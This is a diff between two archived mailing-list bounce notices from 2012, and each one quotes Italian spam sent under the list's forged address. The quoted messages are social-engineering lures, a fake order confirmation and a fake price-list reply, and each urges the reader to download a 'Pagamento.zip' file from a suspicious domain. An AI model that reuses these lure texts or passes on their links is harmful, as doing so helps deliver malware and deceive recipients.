@@ -1,10 +1,9 @@
-From: MAILER-DAEMON-mVrslVNv4LdwCRcL5F1ibV6hYfS7NtTn@public.gmane.org
-Subject: failure notice
-Date: 2 Apr 2012 22:04:56 -0000
-Message-ID: <20120402220508.02176861@mail.linuxfoundation.org>
+From: postmaster-noreply-FMRk+c35SBqonA0d6jMUrA@public.gmane.org
+Subject: Undelivered Mail Returned to Sender
+Date: Mon,  2 Apr 2012 23:57:38 +0200 (CEST)
+Message-ID: <20120402215738.EDEE02C379@smtpsrv.playnet.it>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============2953074446369293717=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -18,53 +17,117 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-Hi. This is the qmail-send program at smtplq03.aruba.it.
-I'm afraid I wasn't able to deliver your message to the following addresses.
-This is a permanent error; I've given up. Sorry it didn't work out.
+This is a MIME-encapsulated message.
 
-<htcarlton-zPyCOAb3p1Nc60lfx3bYgQ@public.gmane.org>:
-194.91.88.8 does not like recipient.
-Remote host said: 550 5.1.1 <htcarlton-zPyCOAb3p1Nc60lfx3bYgQ@public.gmane.org>: Recipient address rejected: User unknown in virtual mailbox table
-Giving up on 194.91.88.8.
+--===============2953074446369293717==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="0971F2CA2C.1333403858/smtpsrv.playnet.it"
+Content-Transfer-Encoding: 7bit
 
---- Below this line is a copy of the message.
+This is a MIME-encapsulated message.
 
-Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: (qmail 817 invoked by uid 89); 2 Apr 2012 22:04:34 -0000
-Received: from unknown (HELO smtp5.aruba.it) (62.149.158.225)
-  by smtplq03.aruba.it with SMTP; 2 Apr 2012 22:04:34 -0000
-Received: (qmail 25177 invoked by uid 89); 2 Apr 2012 22:04:34 -0000
-Received: from unknown (HELO LOCAL.HOST) (nicoletta.andrighetti-dEuHCa9tkVqakFbOCMqv9be5+XYbh3On@public.gmane.org@85.10.211.116)
-  by smtp5.ad.aruba.it with SMTP; 2 Apr 2012 22:04:34 -0000
-Received: from [192.168.137.1] by LOCAL.HOST id wNfIHs8Yee6We; Tue, 03 Apr 2012 00:04:33 +0200
-Message-ID: <002101cd111c$9464c180$0189a8c0-7PjSQ+wCsSudNYLACK+ndg@public.gmane.org>
+--0971F2CA2C.1333403858/smtpsrv.playnet.it
+Content-Description: Notification
+Content-Type: text/plain; charset=us-ascii
+
+This is the mail system at host smtpsrv.playnet.it.
+
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
+
+For further assistance, please contact Playnet Helpdesk Support.
+
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
+
+                   The mail system
+
+<mauro882-IWqWACnzNjyonA0d6jMUrA@public.gmane.org>: host imp-2.mail.tiscali.it[213.205.33.249] said: 550
+    5.1.0 <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org> SPF Failed - not authorized
+    (in reply to MAIL FROM command)
+
+<2037342paolopop-8cRKiK8W3qA@public.gmane.org>: host mx.mail.inet.it[213.92.5.130] said: 550 #5.1.0
+    Address rejected 2037342paolopop-8cRKiK8W3qA@public.gmane.org (in reply to RCPT TO command)
+
+<ice.clara-gH+WsCr1+wQ1GQ1Ptb7lUw@public.gmane.org>: host mxmi.virgilio.it[212.48.20.23] said: 550 RCPT
+    TO:<ice.clara-gH+WsCr1+wQ1GQ1Ptb7lUw@public.gmane.org> User unknown (in reply to RCPT TO command)
+
+--0971F2CA2C.1333403858/smtpsrv.playnet.it
+Content-Description: Delivery report
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns; smtpsrv.playnet.it
+X-Postfix-Queue-ID: 0971F2CA2C
+X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Arrival-Date: Mon,  2 Apr 2012 23:57:12 +0200 (CEST)
+
+Final-Recipient: rfc822; mauro882-IWqWACnzNjyonA0d6jMUrA@public.gmane.org
+Original-Recipient: rfc822;mauro882-IWqWACnzNjyonA0d6jMUrA@public.gmane.org
+Action: failed
+Status: 5.1.0
+Remote-MTA: dns; imp-2.mail.tiscali.it
+Diagnostic-Code: smtp; 550 5.1.0 <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org> SPF
+    Failed - not authorized
+
+Final-Recipient: rfc822; 2037342paolopop-8cRKiK8W3qA@public.gmane.org
+Original-Recipient: rfc822;2037342paolopop-8cRKiK8W3qA@public.gmane.org
+Action: failed
+Status: 5.0.0
+Remote-MTA: dns; mx.mail.inet.it
+Diagnostic-Code: smtp; 550 #5.1.0 Address rejected 2037342paolopop-8cRKiK8W3qA@public.gmane.org
+
+Final-Recipient: rfc822; ice.clara-gH+WsCr1+wQ1GQ1Ptb7lUw@public.gmane.org
+Original-Recipient: rfc822;ice.clara-gH+WsCr1+wQ1GQ1Ptb7lUw@public.gmane.org
+Action: failed
+Status: 5.0.0
+Remote-MTA: dns; mxmi.virgilio.it
+Diagnostic-Code: smtp; 550 RCPT TO:<ice.clara-gH+WsCr1+wQ1GQ1Ptb7lUw@public.gmane.org> User unknown
+
+--0971F2CA2C.1333403858/smtpsrv.playnet.it
+Content-Description: Undelivered Message
+Content-Type: message/rfc822
+Content-Transfer-Encoding: 7bit
+
+Received: from LOCAL.HOST (static.85-10-211-116.clients.your-server.de [85.10.211.116])
+	by smtpsrv.playnet.it (Postfix) with ESMTPA id 0971F2CA2C;
+	Mon,  2 Apr 2012 23:57:12 +0200 (CEST)
+Received: from [192.168.137.100] by LOCAL.HOST id trbfSOq8EE3f; Mon, 02 Apr 2012 23:57:11 +0200
+Message-ID: <003001cd111b$8cf0e880$6489a8c0-7PjSQ+wCsSudNYLACK+ndg@public.gmane.org>
 From: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <giorgio.bortoletto-7XfLUQJRLbk1GQ1Ptb7lUw@public.gmane.org>
-Subject: {LINE[s7]}
-Date: Tue, 03 Apr 2012 00:04:33 +0200
+To: <prenjmegen-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org>
+Subject: Re: prezzo corrente
+Date: Mon, 02 Apr 2012 23:57:11 +0200
 MIME-Version: 1.0
-Content-type: text/plain; charset=windows-1252
-Content-Transfer-Encoding: 8bit
-X-Spam-Rating: smtp5.ad.aruba.it 1.6.2 0/1000/N
-X-Spam-Rating: smtplq03.aruba.it 1.6.2 0/1000/N
+Content-type: text/plain; charset=us-ascii 
+Content-Transfer-Encoding: quoted-printable
 
 
 
+Gentile, prenjmegen-VGgt2q2+T+FECS10DBIrLA@public.gmane.org
 
-Grazie per l'inserimento di un ordine con noi!
+>> Invia-to-date listino prezzi per favore
 
-Desideriamo informarLa che abbiamo ricevuto il vostro ordine e verra elaborato molto presto. Il vostro numero d'ordine e 666-666 e si dovrebbe essere consegnato entro 2-5 giorni lavorativi. Si prega di notare che nella maggior parte dei casi, la consegna e piu veloce indicato come vogliamo farvi iniziare a godere l'acquisto il piu presto possibile. Nel frattempo, si puo accedere al sito e verificare lo stato dell'ordine in qualsiasi momento tramite la pagina 'Il mio Account'.
-
-Se avete domande sul tuo ordine, non esitate a contattarci via email a support-8+Fz2nuxnMdx6Cjg0PwtpTYe/PSvh27I@public.gmane.org Non appena ordine e stato spedito, il nostro esecutivo Servizio Clienti monitorare i progressi e tenervi aggiornati in ogni momento.
-
-Richiedi il tuo premio speciale
-
-Ancora una volta, vorremmo ringraziarvi per il vostro acquisto e speriamo di rivedervi presto.
-Fare clic sul seguente link per il pagamento e le informazioni di consegna
-http://alevligeceler.net/materiale/Pagamento.zip?QiYxNOjqFz
+Ciao.
+Potete scaricare alla
+http://alaein.com/materiale/Pagamento.zip
 
 
+=3D=3D
+Support,
+Tel./Fax.: (051) 635 15 02=20
 
-Chi si accontenta gode.
-Responsabile Servizio Clienti
-fullgadgets.com
+
+
+--0971F2CA2C.1333403858/smtpsrv.playnet.it--
+
+--===============2953074446369293717==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--===============2953074446369293717==--
